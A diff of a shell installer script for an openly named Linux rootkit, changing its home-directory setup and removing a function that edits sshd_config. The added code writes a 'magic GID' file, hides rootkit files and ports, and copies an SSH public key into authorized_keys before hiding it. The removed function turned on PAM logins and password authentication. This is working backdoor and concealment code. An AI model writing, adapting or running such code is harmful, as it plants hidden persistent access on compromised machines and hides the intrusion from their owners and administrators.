@@ -74,31 +74,21 @@ setup_home(){ # $1 = home/install directory
         write_hideports $HIDEPORTS;
     }
 
+    [ "`toggles READ_GID_FROM_FILE`" == 'true' ] && {
+        necho 'Setting up magic GID file' &&
+        touch $GID_PATH && chmod 644 $GID_PATH &&
+        echo -n "$MAGIC_GID" > $GID_PATH;
+    }
+
     [ "`toggle_enabled HIDE_SELF`" == "true" ] && {
         necho "Hiding all rootkit files" &&
         hide_rootkitfiles $homedir;
     }
+
 
     [ -f './etc/id_rsa.pub' ] && {
         necho "Copying ./etc/id_rsa.pub to $homedir/.ssh/authorized_keys" &&
         mkdir $homedir/.ssh && cp ./etc/id_rsa.pub $homedir/.ssh/authorized_keys &&
         hide_path $homedir/.ssh/authorized_keys;
     }
-}
-
-# should PAM logins and password authentications need be enabled,
-# it gets done here. this gets run on install if USE_PAM_BD is enabled.
-# doing this is a little questionable as we're making very obvious
-# changes to the box.
-patch_sshdconfig(){
-    local sshd_config=/etc/ssh/sshd_config
-    [ ! -f $sshd_config ] && return
-
-    # enable PAM logins
-    [ "`cat $sshd_config | grep 'UsePAM'`" == 'UsePAM yes' ] ||
-        echo 'UsePAM yes' >> $sshd_config
-
-    # enable user password authentications.
-    [ "`cat $sshd_config | grep 'PasswordAuthentication yes'`" == 'PasswordAuthentication yes' ] ||
-        echo 'PasswordAuthentication yes' >> $sshd_config
 }
